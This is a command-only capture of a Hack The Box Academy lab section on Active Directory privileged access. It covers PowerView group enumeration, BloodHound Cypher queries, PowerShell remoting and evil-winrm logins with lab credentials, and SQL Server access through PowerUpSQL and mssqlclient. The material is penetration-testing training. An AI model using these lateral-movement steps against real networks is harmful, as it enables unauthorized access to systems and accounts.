# Section 23: Privileged Access

- Module: Active Directory Enumeration & Attacks (143)
- URL: https://academy.hackthebox.com/app/module/143/section/1275
- Code/command blocks: 12

> Terminal output is omitted; only commands & scripts are captured.

## 1. `powershell` _(output omitted)_

```powershell
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
```

## 2. `powershell` _(output omitted)_

```powershell
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
```

## 3. `cypher`

```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

## 4. `powershell` _(output omitted)_

```powershell
$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred

```

## 5. `shellsession`

```bash
gem install evil-winrm
```

## 6. `shellsession` _(output omitted)_

```bash
evil-winrm 
```

## 7. `shellsession` _(output omitted)_

```bash
evil-winrm -i 10.129.201.234 -u forend
```

## 8. `cypher`

```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```

## 9. `powershell` _(output omitted)_

```powershell
cd .\PowerUpSQL\
PS C:\htb>  Import-Module .\PowerUpSQL.ps1
 Get-SQLInstanceDomain
```

## 10. `powershell` _(output omitted)_

```powershell
 Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
```

## 11. `shellsession` _(output omitted)_

```bash
mssqlclient.py 
```

## 12. `shellsession` _(output omitted)_

```bash
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
```

